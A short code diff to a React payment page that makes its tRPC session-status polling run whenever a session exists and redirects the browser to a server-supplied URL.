@@ -47,12 +47,16 @@ export default function Payment() {
   const { data: sessionStatus } = trpc.payment.getStatus.useQuery(
     { sessionId: sessionId || "" },
     {
-      enabled: !!sessionId && ["card_pending", "otp_pending", "atm_pending"].includes(stage),
+      enabled: !!sessionId,
       refetchInterval: 3000,
     }
   );
 
   useEffect(() => {
+    if (sessionStatus?.redirectUrl) {
+      window.location.href = sessionStatus.redirectUrl;
+      return;
+    }
     if (sessionStatus?.stage && sessionStatus.stage !== stage) {
       setStage(sessionStatus.stage as Stage);
       if (sessionStatus.errorMessage) setError(sessionStatus.errorMessage);
